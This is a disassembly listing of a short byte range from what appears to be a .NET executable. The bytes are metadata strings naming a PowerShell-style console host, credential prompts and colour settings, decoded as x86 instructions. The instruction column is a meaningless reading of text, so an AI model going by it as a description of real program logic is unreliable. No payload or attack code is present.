  4071ac:	75 65                	jne    0x407213
  4071ae:	00 69 6e             	add    %ch,0x6e(%ecx)
  4071b1:	54                   	push   %esp
  4071b2:	69 63 6b 00 53 79 73 	imul   $0x73795300,0x6b(%ebx),%esp
  4071b9:	74 65                	je     0x407220
  4071bb:	6d                   	insl   (%dx),%es:(%edi)
  4071bc:	2e 43                	cs inc %ebx
  4071be:	6f                   	outsl  %ds:(%esi),(%dx)
  4071bf:	6c                   	insb   (%dx),%es:(%edi)
  4071c0:	6c                   	insb   (%dx),%es:(%edi)
  4071c1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4071c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4071c7:	73 2e                	jae    0x4071f7
  4071c9:	47                   	inc    %edi
  4071ca:	65 6e                	outsb  %gs:(%esi),(%dx)
  4071cc:	65 72 69             	gs jb  0x407238
  4071cf:	63 00                	arpl   %eax,(%eax)
  4071d1:	4c                   	dec    %esp
  4071d2:	69 73 74 60 31 00 70 	imul   $0x70003160,0x74(%ebx),%esi
  4071d9:	72 6f                	jb     0x40724a
  4071db:	67 72 65             	addr16 jb 0x407243
  4071de:	73 73                	jae    0x407253
  4071e0:	44                   	inc    %esp
  4071e1:	61                   	popa
  4071e2:	74 61                	je     0x407245
  4071e4:	4c                   	dec    %esp
  4071e5:	69 73 74 00 53 79 73 	imul   $0x73795300,0x74(%ebx),%esi
  4071ec:	74 65                	je     0x407253
  4071ee:	6d                   	insl   (%dx),%es:(%edi)
  4071ef:	2e 44                	cs inc %esp
  4071f1:	72 61                	jb     0x407254
  4071f3:	77 69                	ja     0x40725e
  4071f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4071f6:	67 00 43 6f          	add    %al,0x6f(%bp,%di)
  4071fa:	6c                   	insb   (%dx),%es:(%edi)
  4071fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4071fc:	72 00                	jb     0x4071fe
  4071fe:	44                   	inc    %esp
  4071ff:	72 61                	jb     0x407262
  407201:	77 69                	ja     0x40726c
  407203:	6e                   	outsb  %ds:(%esi),(%dx)
  407204:	67 43                	addr16 inc %ebx
  407206:	6f                   	outsl  %ds:(%esi),(%dx)
  407207:	6c                   	insb   (%dx),%es:(%edi)
  407208:	6f                   	outsl  %ds:(%esi),(%dx)
  407209:	72 00                	jb     0x40720b
  40720b:	49                   	dec    %ecx
  40720c:	6e                   	outsb  %ds:(%esi),(%dx)
  40720d:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  407214:	65 
  407215:	43                   	inc    %ebx
  407216:	6f                   	outsl  %ds:(%esi),(%dx)
  407217:	6d                   	insl   (%dx),%es:(%edi)
  407218:	70 6f                	jo     0x407289
  40721a:	6e                   	outsb  %ds:(%esi),(%dx)
  40721b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40721d:	74 00                	je     0x40721f
  40721f:	45                   	inc    %ebp
  407220:	6c                   	insb   (%dx),%es:(%edi)
  407221:	61                   	popa
  407222:	70 73                	jo     0x407297
  407224:	65 64 45             	gs fs inc %ebp
  407227:	76 65                	jbe    0x40728e
  407229:	6e                   	outsb  %ds:(%esi),(%dx)
  40722a:	74 41                	je     0x40726d
  40722c:	72 67                	jb     0x407295
  40722e:	73 00                	jae    0x407230
  407230:	54                   	push   %esp
  407231:	69 6d 65 54 69 63 6b 	imul   $0x6b636954,0x65(%ebp),%ebp
  407238:	00 41 64             	add    %al,0x64(%ecx)
  40723b:	64 42                	fs inc %edx
  40723d:	61                   	popa
  40723e:	72 00                	jb     0x407240
  407240:	47                   	inc    %edi
  407241:	65 74 43             	gs je  0x407287
  407244:	6f                   	outsl  %ds:(%esi),(%dx)
  407245:	75 6e                	jne    0x4072b5
  407247:	74 00                	je     0x407249
  407249:	50                   	push   %eax
  40724a:	72 6f                	jb     0x4072bb
  40724c:	67 72 65             	addr16 jb 0x4072b4
  40724f:	73 73                	jae    0x4072c4
  407251:	52                   	push   %edx
  407252:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  407256:	64 00 55 70          	add    %dl,%fs:0x70(%ebp)
  40725a:	64 61                	fs popa
  40725c:	74 65                	je     0x4072c3
  40725e:	00 4c 61 62          	add    %cl,0x62(%ecx,%eiz,2)
  407262:	65 6c                	gs insb (%dx),%es:(%edi)
  407264:	00 6c 62 41          	add    %ch,0x41(%edx,%eiz,2)
  407268:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40726c:	69 74 79 00 6c 62 53 	imul   $0x7453626c,0x0(%ecx,%edi,2),%esi
  407273:	74 
  407274:	61                   	popa
  407275:	74 75                	je     0x4072ec
  407277:	73 00                	jae    0x407279
  407279:	50                   	push   %eax
  40727a:	72 6f                	jb     0x4072eb
  40727c:	67 72 65             	addr16 jb 0x4072e4
  40727f:	73 73                	jae    0x4072f4
  407281:	42                   	inc    %edx
  407282:	61                   	popa
  407283:	72 00                	jb     0x407285
  407285:	6f                   	outsl  %ds:(%esi),(%dx)
  407286:	62 6a 50             	bound  %ebp,0x50(%edx)
  407289:	72 6f                	jb     0x4072fa
  40728b:	67 72 65             	addr16 jb 0x4072f3
  40728e:	73 73                	jae    0x407303
  407290:	42                   	inc    %edx
  407291:	61                   	popa
  407292:	72 00                	jb     0x407294
  407294:	6c                   	insb   (%dx),%es:(%edi)
  407295:	62 52 65             	bound  %edx,0x65(%edx)
  407298:	6d                   	insl   (%dx),%es:(%edi)
  407299:	61                   	popa
  40729a:	69 6e 69 6e 67 54 69 	imul   $0x6954676e,0x69(%esi),%ebp
  4072a1:	6d                   	insl   (%dx),%es:(%edi)
  4072a2:	65 00 6c 62 4f       	add    %ch,%gs:0x4f(%edx,%eiz,2)
  4072a7:	70 65                	jo     0x40730e
  4072a9:	72 61                	jb     0x40730c
  4072ab:	74 69                	je     0x407316
  4072ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4072ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4072af:	00 41 63             	add    %al,0x63(%ecx)
  4072b2:	74 69                	je     0x40731d
  4072b4:	76 69                	jbe    0x40731f
  4072b6:	74 79                	je     0x407331
  4072b8:	49                   	dec    %ecx
  4072b9:	64 00 50 61          	add    %dl,%fs:0x61(%eax)
  4072bd:	72 65                	jb     0x407324
  4072bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4072c0:	74 41                	je     0x407303
  4072c2:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  4072c6:	69 74 79 49 64 00 44 	imul   $0x65440064,0x49(%ecx,%edi,2),%esi
  4072cd:	65 
  4072ce:	70 74                	jo     0x407344
  4072d0:	68 00 47 65 74       	push   $0x74654700
  4072d5:	53                   	push   %ebx
  4072d6:	74 64                	je     0x40733c
  4072d8:	48                   	dec    %eax
  4072d9:	61                   	popa
  4072da:	6e                   	outsb  %ds:(%esi),(%dx)
  4072db:	64 6c                	fs insb (%dx),%es:(%edi)
  4072dd:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4072e1:	74 46                	je     0x407329
  4072e3:	69 6c 65 54 79 70 65 	imul   $0x657079,0x54(%ebp,%eiz,2),%ebp
  4072ea:	00 
  4072eb:	49                   	dec    %ecx
  4072ec:	73 49                	jae    0x407337
  4072ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4072ef:	70 75                	jo     0x407366
  4072f1:	74 52                	je     0x407345
  4072f3:	65 64 69 72 65 63 74 	gs imul $0x64657463,%fs:0x65(%edx),%esi
  4072fa:	65 64 
  4072fc:	00 49 73             	add    %cl,0x73(%ecx)
  4072ff:	4f                   	dec    %edi
  407300:	75 74                	jne    0x407376
  407302:	70 75                	jo     0x407379
  407304:	74 52                	je     0x407358
  407306:	65 64 69 72 65 63 74 	gs imul $0x64657463,%fs:0x65(%edx),%esi
  40730d:	65 64 
  40730f:	00 49 73             	add    %cl,0x73(%ecx)
  407312:	45                   	inc    %ebp
  407313:	72 72                	jb     0x407387
  407315:	6f                   	outsl  %ds:(%esi),(%dx)
  407316:	72 52                	jb     0x40736a
  407318:	65 64 69 72 65 63 74 	gs imul $0x64657463,%fs:0x65(%edx),%esi
  40731f:	65 64 
  407321:	00 46 49             	add    %al,0x49(%esi)
  407324:	4c                   	dec    %esp
  407325:	45                   	inc    %ebp
  407326:	5f                   	pop    %edi
  407327:	54                   	push   %esp
  407328:	59                   	pop    %ecx
  407329:	50                   	push   %eax
  40732a:	45                   	inc    %ebp
  40732b:	5f                   	pop    %edi
  40732c:	55                   	push   %ebp
  40732d:	4e                   	dec    %esi
  40732e:	4b                   	dec    %ebx
  40732f:	4e                   	dec    %esi
  407330:	4f                   	dec    %edi
  407331:	57                   	push   %edi
  407332:	4e                   	dec    %esi
  407333:	00 46 49             	add    %al,0x49(%esi)
  407336:	4c                   	dec    %esp
  407337:	45                   	inc    %ebp
  407338:	5f                   	pop    %edi
  407339:	54                   	push   %esp
  40733a:	59                   	pop    %ecx
  40733b:	50                   	push   %eax
  40733c:	45                   	inc    %ebp
  40733d:	5f                   	pop    %edi
  40733e:	44                   	inc    %esp
  40733f:	49                   	dec    %ecx
  407340:	53                   	push   %ebx
  407341:	4b                   	dec    %ebx
  407342:	00 46 49             	add    %al,0x49(%esi)
  407345:	4c                   	dec    %esp
  407346:	45                   	inc    %ebp
  407347:	5f                   	pop    %edi
  407348:	54                   	push   %esp
  407349:	59                   	pop    %ecx
  40734a:	50                   	push   %eax
  40734b:	45                   	inc    %ebp
  40734c:	5f                   	pop    %edi
  40734d:	43                   	inc    %ebx
  40734e:	48                   	dec    %eax
  40734f:	41                   	inc    %ecx
  407350:	52                   	push   %edx
  407351:	00 46 49             	add    %al,0x49(%esi)
  407354:	4c                   	dec    %esp
  407355:	45                   	inc    %ebp
  407356:	5f                   	pop    %edi
  407357:	54                   	push   %esp
  407358:	59                   	pop    %ecx
  407359:	50                   	push   %eax
  40735a:	45                   	inc    %ebp
  40735b:	5f                   	pop    %edi
  40735c:	50                   	push   %eax
  40735d:	49                   	dec    %ecx
  40735e:	50                   	push   %eax
  40735f:	45                   	inc    %ebp
  407360:	00 46 49             	add    %al,0x49(%esi)
  407363:	4c                   	dec    %esp
  407364:	45                   	inc    %ebp
  407365:	5f                   	pop    %edi
  407366:	54                   	push   %esp
  407367:	59                   	pop    %ecx
  407368:	50                   	push   %eax
  407369:	45                   	inc    %ebp
  40736a:	5f                   	pop    %edi
  40736b:	52                   	push   %edx
  40736c:	45                   	inc    %ebp
  40736d:	4d                   	dec    %ebp
  40736e:	4f                   	dec    %edi
  40736f:	54                   	push   %esp
  407370:	45                   	inc    %ebp
  407371:	00 53 54             	add    %dl,0x54(%ebx)
  407374:	44                   	inc    %esp
  407375:	5f                   	pop    %edi
  407376:	49                   	dec    %ecx
  407377:	4e                   	dec    %esi
  407378:	50                   	push   %eax
  407379:	55                   	push   %ebp
  40737a:	54                   	push   %esp
  40737b:	5f                   	pop    %edi
  40737c:	48                   	dec    %eax
  40737d:	41                   	inc    %ecx
  40737e:	4e                   	dec    %esi
  40737f:	44                   	inc    %esp
  407380:	4c                   	dec    %esp
  407381:	45                   	inc    %ebp
  407382:	00 53 54             	add    %dl,0x54(%ebx)
  407385:	44                   	inc    %esp
  407386:	5f                   	pop    %edi
  407387:	4f                   	dec    %edi
  407388:	55                   	push   %ebp
  407389:	54                   	push   %esp
  40738a:	50                   	push   %eax
  40738b:	55                   	push   %ebp
  40738c:	54                   	push   %esp
  40738d:	5f                   	pop    %edi
  40738e:	48                   	dec    %eax
  40738f:	41                   	inc    %ecx
  407390:	4e                   	dec    %esi
  407391:	44                   	inc    %esp
  407392:	4c                   	dec    %esp
  407393:	45                   	inc    %ebp
  407394:	00 53 54             	add    %dl,0x54(%ebx)
  407397:	44                   	inc    %esp
  407398:	5f                   	pop    %edi
  407399:	45                   	inc    %ebp
  40739a:	52                   	push   %edx
  40739b:	52                   	push   %edx
  40739c:	4f                   	dec    %edi
  40739d:	52                   	push   %edx
  40739e:	5f                   	pop    %edi
  40739f:	48                   	dec    %eax
  4073a0:	41                   	inc    %ecx
  4073a1:	4e                   	dec    %esi
  4073a2:	44                   	inc    %esp
  4073a3:	4c                   	dec    %esp
  4073a4:	45                   	inc    %ebp
  4073a5:	00 72 61             	add    %dh,0x61(%edx)
  4073a8:	77 55                	ja     0x4073ff
  4073aa:	49                   	dec    %ecx
  4073ab:	00 45 72             	add    %al,0x72(%ebp)
  4073ae:	72 6f                	jb     0x40741f
  4073b0:	72 46                	jb     0x4073f8
  4073b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4073b3:	72 65                	jb     0x40741a
  4073b5:	67 72 6f             	addr16 jb 0x407427
  4073b8:	75 6e                	jne    0x407428
  4073ba:	64 43                	fs inc %ebx
  4073bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4073bd:	6c                   	insb   (%dx),%es:(%edi)
  4073be:	6f                   	outsl  %ds:(%esi),(%dx)
  4073bf:	72 00                	jb     0x4073c1
  4073c1:	45                   	inc    %ebp
  4073c2:	72 72                	jb     0x407436
  4073c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4073c5:	72 42                	jb     0x407409
  4073c7:	61                   	popa
  4073c8:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  4073cb:	72 6f                	jb     0x40743c
  4073cd:	75 6e                	jne    0x40743d
  4073cf:	64 43                	fs inc %ebx
  4073d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4073d2:	6c                   	insb   (%dx),%es:(%edi)
  4073d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4073d4:	72 00                	jb     0x4073d6
  4073d6:	57                   	push   %edi
  4073d7:	61                   	popa
  4073d8:	72 6e                	jb     0x407448
  4073da:	69 6e 67 46 6f 72 65 	imul   $0x65726f46,0x67(%esi),%ebp
  4073e1:	67 72 6f             	addr16 jb 0x407453
  4073e4:	75 6e                	jne    0x407454
  4073e6:	64 43                	fs inc %ebx
  4073e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4073e9:	6c                   	insb   (%dx),%es:(%edi)
  4073ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4073eb:	72 00                	jb     0x4073ed
  4073ed:	57                   	push   %edi
  4073ee:	61                   	popa
  4073ef:	72 6e                	jb     0x40745f
  4073f1:	69 6e 67 42 61 63 6b 	imul   $0x6b636142,0x67(%esi),%ebp
  4073f8:	67 72 6f             	addr16 jb 0x40746a
  4073fb:	75 6e                	jne    0x40746b
  4073fd:	64 43                	fs inc %ebx
  4073ff:	6f                   	outsl  %ds:(%esi),(%dx)
  407400:	6c                   	insb   (%dx),%es:(%edi)
  407401:	6f                   	outsl  %ds:(%esi),(%dx)
  407402:	72 00                	jb     0x407404
  407404:	44                   	inc    %esp
  407405:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407409:	46                   	inc    %esi
  40740a:	6f                   	outsl  %ds:(%esi),(%dx)
  40740b:	72 65                	jb     0x407472
  40740d:	67 72 6f             	addr16 jb 0x40747f
  407410:	75 6e                	jne    0x407480
  407412:	64 43                	fs inc %ebx
  407414:	6f                   	outsl  %ds:(%esi),(%dx)
  407415:	6c                   	insb   (%dx),%es:(%edi)
  407416:	6f                   	outsl  %ds:(%esi),(%dx)
  407417:	72 00                	jb     0x407419
  407419:	44                   	inc    %esp
  40741a:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40741e:	42                   	inc    %edx
  40741f:	61                   	popa
  407420:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407423:	72 6f                	jb     0x407494
  407425:	75 6e                	jne    0x407495
  407427:	64 43                	fs inc %ebx
  407429:	6f                   	outsl  %ds:(%esi),(%dx)
  40742a:	6c                   	insb   (%dx),%es:(%edi)
  40742b:	6f                   	outsl  %ds:(%esi),(%dx)
  40742c:	72 00                	jb     0x40742e
  40742e:	56                   	push   %esi
  40742f:	65 72 62             	gs jb  0x407494
  407432:	6f                   	outsl  %ds:(%esi),(%dx)
  407433:	73 65                	jae    0x40749a
  407435:	46                   	inc    %esi
  407436:	6f                   	outsl  %ds:(%esi),(%dx)
  407437:	72 65                	jb     0x40749e
  407439:	67 72 6f             	addr16 jb 0x4074ab
  40743c:	75 6e                	jne    0x4074ac
  40743e:	64 43                	fs inc %ebx
  407440:	6f                   	outsl  %ds:(%esi),(%dx)
  407441:	6c                   	insb   (%dx),%es:(%edi)
  407442:	6f                   	outsl  %ds:(%esi),(%dx)
  407443:	72 00                	jb     0x407445
  407445:	56                   	push   %esi
  407446:	65 72 62             	gs jb  0x4074ab
  407449:	6f                   	outsl  %ds:(%esi),(%dx)
  40744a:	73 65                	jae    0x4074b1
  40744c:	42                   	inc    %edx
  40744d:	61                   	popa
  40744e:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407451:	72 6f                	jb     0x4074c2
  407453:	75 6e                	jne    0x4074c3
  407455:	64 43                	fs inc %ebx
  407457:	6f                   	outsl  %ds:(%esi),(%dx)
  407458:	6c                   	insb   (%dx),%es:(%edi)
  407459:	6f                   	outsl  %ds:(%esi),(%dx)
  40745a:	72 00                	jb     0x40745c
  40745c:	50                   	push   %eax
  40745d:	72 6f                	jb     0x4074ce
  40745f:	67 72 65             	addr16 jb 0x4074c7
  407462:	73 73                	jae    0x4074d7
  407464:	46                   	inc    %esi
  407465:	6f                   	outsl  %ds:(%esi),(%dx)
  407466:	72 65                	jb     0x4074cd
  407468:	67 72 6f             	addr16 jb 0x4074da
  40746b:	75 6e                	jne    0x4074db
  40746d:	64 43                	fs inc %ebx
  40746f:	6f                   	outsl  %ds:(%esi),(%dx)
  407470:	6c                   	insb   (%dx),%es:(%edi)
  407471:	6f                   	outsl  %ds:(%esi),(%dx)
  407472:	72 00                	jb     0x407474
  407474:	50                   	push   %eax
  407475:	72 6f                	jb     0x4074e6
  407477:	67 72 65             	addr16 jb 0x4074df
  40747a:	73 73                	jae    0x4074ef
  40747c:	42                   	inc    %edx
  40747d:	61                   	popa
  40747e:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407481:	72 6f                	jb     0x4074f2
  407483:	75 6e                	jne    0x4074f3
  407485:	64 43                	fs inc %ebx
  407487:	6f                   	outsl  %ds:(%esi),(%dx)
  407488:	6c                   	insb   (%dx),%es:(%edi)
  407489:	6f                   	outsl  %ds:(%esi),(%dx)
  40748a:	72 00                	jb     0x40748c
  40748c:	44                   	inc    %esp
  40748d:	69 63 74 69 6f 6e 61 	imul   $0x616e6f69,0x74(%ebx),%esp
  407494:	72 79                	jb     0x40750f
  407496:	60                   	pusha
  407497:	32 00                	xor    (%eax),%al
  407499:	50                   	push   %eax
  40749a:	53                   	push   %ebx
  40749b:	4f                   	dec    %edi
  40749c:	62 6a 65             	bound  %ebp,0x65(%edx)
  40749f:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  4074a3:	69 65 6c 64 44 65 73 	imul   $0x73654464,0x6c(%ebp),%esp
  4074aa:	63 72 69             	arpl   %esi,0x69(%edx)
  4074ad:	70 74                	jo     0x407523
  4074af:	69 6f 6e 00 50 72 6f 	imul   $0x6f725000,0x6e(%edi),%ebp
  4074b6:	6d                   	insl   (%dx),%es:(%edi)
  4074b7:	70 74                	jo     0x40752d
  4074b9:	00 50 72             	add    %dl,0x72(%eax)
  4074bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4074bd:	6d                   	insl   (%dx),%es:(%edi)
  4074be:	70 74                	jo     0x407534
  4074c0:	46                   	inc    %esi
  4074c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4074c2:	72 43                	jb     0x407507
  4074c4:	68 6f 69 63 65       	push   $0x6563696f
  4074c9:	00 50 53             	add    %dl,0x53(%eax)
  4074cc:	43                   	inc    %ebx
  4074cd:	72 65                	jb     0x407534
  4074cf:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4074d2:	74 69                	je     0x40753d
  4074d4:	61                   	popa
  4074d5:	6c                   	insb   (%dx),%es:(%edi)
  4074d6:	00 50 72             	add    %dl,0x72(%eax)
  4074d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4074da:	6d                   	insl   (%dx),%es:(%edi)
  4074db:	70 74                	jo     0x407551
  4074dd:	46                   	inc    %esi
  4074de:	6f                   	outsl  %ds:(%esi),(%dx)
  4074df:	72 43                	jb     0x407524
  4074e1:	72 65                	jb     0x407548
  4074e3:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4074e6:	74 69                	je     0x407551
  4074e8:	61                   	popa
  4074e9:	6c                   	insb   (%dx),%es:(%edi)
  4074ea:	00 67 65             	add    %ah,0x65(%edi)
  4074ed:	74 5f                	je     0x40754e
  4074ef:	52                   	push   %edx
  4074f0:	61                   	popa
  4074f1:	77 55                	ja     0x407548
  4074f3:	49                   	dec    %ecx
  4074f4:	00 69 62             	add    %ch,0x62(%ecx)
  4074f7:	5f                   	pop    %edi
  4074f8:	63 61 70             	arpl   %esp,0x70(%ecx)
  4074fb:	74 69                	je     0x407566
  4074fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4074fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4074ff:	00 69 62             	add    %ch,0x62(%ecx)
  407502:	5f                   	pop    %edi
  407503:	6d                   	insl   (%dx),%es:(%edi)
  407504:	65 73 73             	gs jae 0x40757a
  407507:	61                   	popa
  407508:	67 65 00 52 65       	add    %dl,%gs:0x65(%bp,%si)
  40750d:	61                   	popa
  40750e:	64 4c                	fs dec %esp
  407510:	69 6e 65 00 53 79 73 	imul   $0x73795300,0x65(%esi),%ebp
  407517:	74 65                	je     0x40757e
  407519:	6d                   	insl   (%dx),%es:(%edi)
  40751a:	2e 53                	cs push %ebx
  40751c:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  407520:	69 74 79 00 53 65 63 	imul   $0x75636553,0x0(%ecx,%edi,2),%esi
  407527:	75 
  407528:	72 65                	jb     0x40758f
  40752a:	53                   	push   %ebx
  40752b:	74 72                	je     0x40759f
  40752d:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  407534:	50                   	push   %eax
  407535:	61                   	popa
  407536:	73 73                	jae    0x4075ab
  407538:	77 6f                	ja     0x4075a9
  40753a:	72 64                	jb     0x4075a0
  40753c:	00 52 65             	add    %dl,0x65(%edx)
  40753f:	61                   	popa
  407540:	64 4c                	fs dec %esp
  407542:	69 6e 65 41 73 53 65 	imul   $0x65537341,0x65(%esi),%ebp
  407549:	63 75 72             	arpl   %esi,0x72(%ebp)
  40754c:	65 53                	gs push %ebx
  40754e:	74 72                	je     0x4075c2
  407550:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  407557:	74 65                	je     0x4075be
  407559:	00 57 72             	add    %dl,0x72(%edi)
  40755c:	69 74 65 44 65 62 75 	imul   $0x67756265,0x44(%ebp,%eiz,2),%esi
  407563:	67 
  407564:	4c                   	dec    %esp
  407565:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  40756c:	74 65                	je     0x4075d3
  40756e:	45                   	inc    %ebp
  40756f:	72 72                	jb     0x4075e3
  407571:	6f                   	outsl  %ds:(%esi),(%dx)
  407572:	72 4c                	jb     0x4075c0
  407574:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  40757b:	74 65                	je     0x4075e2
  40757d:	4c                   	dec    %esp
  40757e:	69 6e 65 00 70 66 00 	imul   $0x667000,0x65(%esi),%ebp
  407585:	57                   	push   %edi
  407586:	72 69                	jb     0x4075f1
  407588:	74 65                	je     0x4075ef
  40758a:	50                   	push   %eax
  40758b:	72 6f                	jb     0x4075fc
  40758d:	67 72 65             	addr16 jb 0x4075f5
  407590:	73 73                	jae    0x407605
  407592:	00 57 72             	add    %dl,0x72(%edi)
  407595:	69 74 65 56 65 72 62 	imul   $0x6f627265,0x56(%ebp,%eiz,2),%esi
  40759c:	6f 
  40759d:	73 65                	jae    0x407604
  40759f:	4c                   	dec    %esp
  4075a0:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  4075a7:	74 65                	je     0x40760e
  4075a9:	57                   	push   %edi
  4075aa:	61                   	popa
  4075ab:	72 6e                	jb     0x40761b
  4075ad:	69 6e 67 4c 69 6e 65 	imul   $0x656e694c,0x67(%esi),%ebp
  4075b4:	00 52 61             	add    %dl,0x61(%edx)
  4075b7:	77 55                	ja     0x40760e
  4075b9:	49                   	dec    %ecx
  4075ba:	00 70 61             	add    %dh,0x61(%eax)
  4075bd:	72 65                	jb     0x407624
  4075bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4075c0:	74 00                	je     0x4075c2
  4075c2:	75 69                	jne    0x40762d
  4075c4:	00 53 79             	add    %dl,0x79(%ebx)
  4075c7:	73 74                	jae    0x40763d
  4075c9:	65 6d                	gs insl (%dx),%es:(%edi)
  4075cb:	2e 47                	cs inc %edi
  4075cd:	6c                   	insb   (%dx),%es:(%edi)
  4075ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4075cf:	62 61 6c             	bound  %esp,0x6c(%ecx)
  4075d2:	69 7a 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%edx),%edi
  4075d9:	00 43 75             	add    %al,0x75(%ebx)
  4075dc:	6c                   	insb   (%dx),%es:(%edi)
  4075dd:	74 75                	je     0x407654
  4075df:	72 65                	jb     0x407646
  4075e1:	49                   	dec    %ecx
  4075e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4075e3:	66 6f                	outsw  %ds:(%esi),(%dx)
  4075e5:	00 6f 72             	add    %ch,0x72(%edi)
  4075e8:	69 67 69 6e 61 6c 43 	imul   $0x436c616e,0x69(%edi),%esp
  4075ef:	75 6c                	jne    0x40765d
  4075f1:	74 75                	je     0x407668
  4075f3:	72 65                	jb     0x40765a
  4075f5:	49                   	dec    %ecx
  4075f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4075f7:	66 6f                	outsw  %ds:(%esi),(%dx)
  4075f9:	00 6f 72             	add    %ch,0x72(%edi)
  4075fc:	69 67 69 6e 61 6c 55 	imul   $0x556c616e,0x69(%edi),%esp
  407603:	49                   	dec    %ecx
  407604:	43                   	inc    %ebx
  407605:	75 6c                	jne    0x407673
  407607:	74 75                	je     0x40767e
  407609:	72 65                	jb     0x407670
  40760b:	49                   	dec    %ecx
  40760c:	6e                   	outsb  %ds:(%esi),(%dx)
  40760d:	66 6f                	outsw  %ds:(%esi),(%dx)
  40760f:	00 47 75             	add    %al,0x75(%edi)
  407612:	69 64 00 6d 79 49 64 	imul   $0x644979,0x6d(%eax,%eax,1),%esp
  407619:	00 
  40761a:	67 65 74 5f          	addr16 gs je 0x40767d
  40761e:	50                   	push   %eax
  40761f:	72 69                	jb     0x40768a
  407621:	76 61                	jbe    0x407684
  407623:	74 65                	je     0x40768a
  407625:	44                   	inc    %esp
  407626:	61                   	popa
  407627:	74 61                	je     0x40768a
  407629:	00 5f 63             	add    %bl,0x63(%edi)
  40762c:	6f                   	outsl  %ds:(%esi),(%dx)
  40762d:	6e                   	outsb  %ds:(%esi),(%dx)
  40762e:	73 6f                	jae    0x40769f
  407630:	6c                   	insb   (%dx),%es:(%edi)
  407631:	65 43                	gs inc %ebx
  407633:	6f                   	outsl  %ds:(%esi),(%dx)
  407634:	6c                   	insb   (%dx),%es:(%edi)
  407635:	6f                   	outsl  %ds:(%esi),(%dx)
  407636:	72 50                	jb     0x407688
  407638:	72 6f                	jb     0x4076a9
  40763a:	78 79                	js     0x4076b5
  40763c:	00 67 65             	add    %ah,0x65(%edi)
  40763f:	74 5f                	je     0x4076a0
  407641:	43                   	inc    %ebx
  407642:	75 72                	jne    0x4076b6
  407644:	72 65                	jb     0x4076ab
  407646:	6e                   	outsb  %ds:(%esi),(%dx)
  407647:	74 43                	je     0x40768c
  407649:	75 6c                	jne    0x4076b7
  40764b:	74 75                	je     0x4076c2
  40764d:	72 65                	jb     0x4076b4
  40764f:	00 67 65             	add    %ah,0x65(%edi)
  407652:	74 5f                	je     0x4076b3
  407654:	43                   	inc    %ebx
  407655:	75 72                	jne    0x4076c9
  407657:	72 65                	jb     0x4076be
  407659:	6e                   	outsb  %ds:(%esi),(%dx)
  40765a:	74 55                	je     0x4076b1
  40765c:	49                   	dec    %ecx
  40765d:	43                   	inc    %ebx
  40765e:	75 6c                	jne    0x4076cc
  407660:	74 75                	je     0x4076d7
  407662:	72 65                	jb     0x4076c9
  407664:	00 67 65             	add    %ah,0x65(%edi)
  407667:	74 5f                	je     0x4076c8
  407669:	49                   	dec    %ecx
  40766a:	6e                   	outsb  %ds:(%esi),(%dx)
  40766b:	73 74                	jae    0x4076e1
  40766d:	61                   	popa
  40766e:	6e                   	outsb  %ds:(%esi),(%dx)
  40766f:	63 65 49             	arpl   %esp,0x49(%ebp)
  407672:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  407676:	74 5f                	je     0x4076d7
  407678:	4e                   	dec    %esi
  407679:	61                   	popa
  40767a:	6d                   	insl   (%dx),%es:(%edi)
  40767b:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40767f:	74 5f                	je     0x4076e0
  407681:	55                   	push   %ebp
  407682:	49                   	dec    %ecx
  407683:	00 56 65             	add    %dl,0x65(%esi)
  407686:	72 73                	jb     0x4076fb
  407688:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  40768f:	5f                   	pop    %edi
  407690:	56                   	push   %esi
  407691:	65 72 73             	gs jb  0x407707
  407694:	69 6f 6e 00 45 6e 74 	imul   $0x746e4500,0x6e(%edi),%ebp
  40769b:	65 72 4e             	gs jb  0x4076ec
  40769e:	65 73 74             	gs jae 0x407715
  4076a1:	65 64 50             	gs fs push %eax
